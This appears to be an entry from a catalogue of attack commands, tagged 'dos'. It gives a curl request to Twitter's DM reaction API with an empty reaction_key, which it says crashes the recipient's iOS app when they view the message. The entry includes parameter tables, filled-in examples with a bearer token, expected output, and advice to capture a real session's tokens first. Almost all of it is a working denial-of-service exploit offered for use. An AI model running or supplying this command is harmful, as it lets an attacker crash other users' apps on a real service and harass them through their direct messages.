---
id: cmd-uuid-123
data: >-
  curl -i
  'https://api.twitter.com/1.1/dm/reaction/new.json?reaction_key=&conversation_id=[CONV_ID]&dm_id=[DM_ID]'
  -X POST -H 'x-csrf-token: [CSRF_TOKEN]' -H 'authorization: Bearer
  AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA'
  -H 'cookie: auth_token=[AUTH_TOKEN]; ct0=[CSRF_TOKEN]'
tags:
  - api
  - dos
  - twitter
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.404Z'
verified: false
validated: true
submitted: true
---
# curl-twitter-dm-invalid-reaction

## Command

```bash
curl -i 'https://api.twitter.com/1.1/dm/reaction/new.json?reaction_key=&conversation_id=[CONV_ID]&dm_id=[DM_ID]' -X POST -H 'x-csrf-token: [CSRF_TOKEN]' -H 'authorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA' -H 'cookie: auth_token=[AUTH_TOKEN]; ct0=[CSRF_TOKEN]'
```

## Description

This curl command sends a modified POST request to Twitter's DM reaction API with an empty reaction_key, exploiting input validation flaws to add a malformed reaction that causes the iOS app to crash when viewing the DM. Use after capturing a legitimate request to obtain tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `reaction_key` | Set to empty string (&reaction_key=) to trigger the vulnerability | Yes |
| `conversation_id` | ID of the DM conversation (replace [CONV_ID]) | Yes |
| `dm_id` | ID of the specific direct message (replace [DM_ID]) | Yes |
| `x-csrf-token` | CSRF protection token from session (replace [CSRF_TOKEN]) | Yes |
| `authorization` | Fixed Bearer token for Twitter API v1.1 | Yes |
| `cookie` | Session cookie with auth_token and ct0 (replace [AUTH_TOKEN] and [CSRF_TOKEN]) | Yes |

## Examples

### Basic Usage

```bash
curl -i 'https://api.twitter.com/1.1/dm/reaction/new.json?reaction_key=&conversation_id=123456789&dm_id=987654321' -X POST -H 'x-csrf-token: abc123' -H 'authorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA' -H 'cookie: auth_token=def456; ct0=abc123'
```

### Advanced Usage

For verbose output, add `-v` flag:

```bash
curl -v -i 'https://api.twitter.com/1.1/dm/reaction/new.json?reaction_key=&conversation_id=[CONV_ID]&dm_id=[DM_ID]' -X POST -H 'x-csrf-token: [CSRF_TOKEN]' -H 'authorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA' -H 'cookie: auth_token=[AUTH_TOKEN]; ct0=[CSRF_TOKEN]'
```

## Expected Output

HTTP/1.1 200 OK response with JSON body indicating successful reaction addition (e.g., {"reaction_id": "..."}), but no visible change on web; triggers iOS crash on DM view.

## Related

- [[procedures/Exploit-Twitter-DM-Reaction-Vulnerability-for-iOS-DoS]]
